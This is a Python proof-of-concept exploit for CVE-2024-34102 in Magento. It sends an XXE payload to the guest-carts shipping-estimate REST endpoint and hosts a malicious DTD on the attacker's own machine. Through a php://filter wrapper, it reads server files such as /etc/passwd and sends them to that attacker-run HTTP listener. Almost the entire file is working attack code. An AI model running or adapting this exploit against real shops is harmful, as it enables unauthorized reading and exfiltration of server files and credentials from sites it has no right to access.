# magento_file_read.py
import sys
import requests
import argparse
import re
import os
import http.server
import socketserver
import threading
import time
import base64
from urllib.parse import urlparse
from queue import Queue, Empty

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ANSI color codes
light_gray_color = '\033[37;1m'
dimmed_gray_color = '\033[90m'
honey_yellow_color = '\033[38;5;214m'
dim_yellow_color = "\033[33;1m"
cyan_color = '\033[96m'
green_color = '\033[92m'
red_color = '\033[31m'
reset_color = '\033[0m'


class FileRead:
    def __init__(self):
        self.last_get_request_time = time.time()
        self.data_queue = Queue()
        self.stop_event = threading.Event()

    def print_message(self, level, message):
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
        if level == 'info':
            print(f"{current_time} {green_color}[INFO]{reset_color} {message}")
        elif level == 'warning':
            print(f"{current_time} {honey_yellow_color}[VLUN]{reset_color}{dim_yellow_color} {message} {reset_color}")
        elif level == 'error':
            print(f"{current_time} {red_color}[ERROR]{reset_color} {message}")

    def clean_host(self, url):
        parsed_url = urlparse(url)
        host = parsed_url.netloc or parsed_url.path
        host = re.sub(r'^www\.', '', host)
        host = re.sub(r'/$', '', host)
        return host

    def setup_webserv(self, ip, port, php_filter):
        if not os.path.exists('webserv'):
            os.makedirs('webserv')
            self.print_message('info', "webserv directory created.")

        poc_path = 'webserv/poc.xml'
        if os.path.exists(poc_path):
            os.remove(poc_path)
            self.print_message('info', "Existing poc.xml file removed.")

        with open(poc_path, 'w') as file:
            file.write(
                f"""<!ENTITY % data SYSTEM "{php_filter}">
                <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://{ip}:{port}/poc.xml?%data;'>">""")
            self.print_message('info', "New poc.xml file created.")

    class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, data_queue=None, server_instance=None, **kwargs):
            self.data_queue = data_queue
            self.server_instance = server_instance
            super().__init__(*args, **kwargs)

        def do_GET(self):
            if "GET /poc.xml HTTP/1.1" in self.path:
                self.server_instance.print_message('warning', f"/i\ Target is vulnerable!.")
                self.server_instance.last_get_request_time = time.time()
                self.server_instance.print_message('warning', "/i\ Target is connected back to us!.")
                encoded_data = self.path.split("poc.xml?")[1].split(" ")[0]
                decoded_data = base64.b64decode(encoded_data)
                self.server_instance.print_message('warning', f"Received file contents:\n{reset_color}{decoded_data}")
                self.server_instance.print_message('info', "Executed successfully.")
                if self.data_queue:
                    self.data_queue.put(decoded_data)
            elif "poc.xml" in self.path:
                self.server_instance.print_message('warning', f"/i\ Target is vulnerable!.")
                self.server_instance.print_message('warning', f"I couldn't read the target file.")
                if "?" in self.path:
                    encoded_data = self.path.split("poc.xml?")[1].split(" ")[0]
                    decoded_data = base64.b64decode(encoded_data)
                    self.server_instance.print_message('warning', f"Received file contents:\n{reset_color}{decoded_data}")
                    if self.data_queue:
                        self.server_instance.print_message('info', "Putting data in queue")
                        self.data_queue.put(decoded_data)
            super().do_GET()

    def start_http_server(self, port, stop_event):
        handler = lambda *args, **kwargs: self.CustomHTTPRequestHandler(*args, data_queue=self.data_queue, server_instance=self, **kwargs)
        os.chdir('webserv')
        try:
            httpd = socketserver.TCPServer(("", port), handler)
        except OSError as e:
            if e.errno == 98:
                self.print_message('error', f"Port {port} is already in use. Please use a different port.")
                self.cleanup()
            else:
                raise
        self.print_message('info', f"Serving HTTP on port {port}")

        def serve_forever(httpd):
            with httpd:
                while not stop_event.is_set():
                    httpd.handle_request()

        server_thread = threading.Thread(target=serve_forever, args=(httpd,))
        server_thread.daemon = True
        server_thread.start()


    def send_request(self, url, host, ip, port):
        full_url = f"{url}/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods"
        headers = {
            "Host": host,
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/json"
        }

        data = {
            "address": {
                "totalsReader": {
                    "collectorList": {
                        "totalCollector": {
                            "sourceData": {
                                "data": f"<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://{ip}:{port}/poc.xml\"> %sp; %param1; ]> <r>&exfil;</r>",
                                "options": 16
                            }
                        }
                    }
                }
            }
        }

        try:
            response = requests.post(full_url, headers=headers, json=data, timeout=10, verify=False)
            self.print_message('info', f"Response status code: {dim_yellow_color}{response.status_code}{reset_color}")
            if response.status_code in [400, 401, 404, 403, 200]:
                self.print_message('info', "Target is not vlun.")
                self.cleanup()
            return response
        except requests.exceptions.TooManyRedirects:
            self.print_message('error', "Exceeded 30 redirects")
            self.print_message('error', "Failed!")
            self.cleanup()
        except requests.exceptions.Timeout:
            self.print_message('error', "The request timed out")
            self.print_message('error', "Failed!")
            self.cleanup()
        except requests.exceptions.SSLError:
            self.print_message('error', "SSL error occurred")
            self.print_message('error', "Failed!")
            self.cleanup()
        except requests.exceptions.RequestException as e:
            self.print_message('error', f"An error occurred: {e}")
            self.print_message('error', "Failed!")
            self.cleanup()
        return None

    def cleanup(self):
        if os.path.exists('webserv'):
            for root, dirs, files in os.walk('webserv', topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
                for name in dirs:
                    os.rmdir(os.path.join(root, name))
            os.rmdir('webserv')
            self.print_message('info', "webserv directory and its contents removed.")

    def check_get_request_timeout(self):
        while not self.stop_event.is_set():
            if time.time() - self.last_get_request_time > 10:
                self.print_message('info', "Max requests reached.")
                self.cleanup()
                self.stop_event.set()

            time.sleep(1)

    def download(self, url, ip, port, path):
        self.last_get_request_time = time.time()

        host = self.clean_host(url)
        php_filter = f"php://filter/convert.base64-encode/resource={path}"
        print(f"this is the php_filter: {php_filter}  ")
        self.setup_webserv(ip, port, php_filter)
        timeout_thread = threading.Thread(target=self.check_get_request_timeout)
        timeout_thread.daemon = True
        timeout_thread.start()

        self.start_http_server(port, self.stop_event)
        self.send_request(url, host, ip, port)

        while True:
            try:
                decoded_data = self.data_queue.get()  # Timeout after 10 seconds
                self.print_message('info', f"Downloaded file, returning decoded_data now")
                return decoded_data
            except Empty:
                self.print_message('error', "No data received within the timeout period.")

    def send(self, url, ip, port, php_filter):
        self.last_get_request_time = time.time()
        host = self.clean_host(url)
        self.setup_webserv(ip, port, php_filter)
        timeout_thread = threading.Thread(target=self.check_get_request_timeout)
        timeout_thread.daemon = True
        timeout_thread.start()

        self.start_http_server(port, self.stop_event)
        response = self.send_request(url, host, ip, port)
        return response


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='POC for CVE-2024-34102')
    parser.add_argument('-u', '--url', required=True, help='Target')
    parser.add_argument('-ip', '--ip', required=True, help='Your IP')
    parser.add_argument('-p', '--port', required=True, help='Port')
    parser.add_argument('-r', '--path', default='/etc/passwd', help='The path to the file to be included in the poc')

    args = parser.parse_args()

    # file_read = FileRead()
    # file_read.main(args.url, args.ip, int(args.port), args.path)
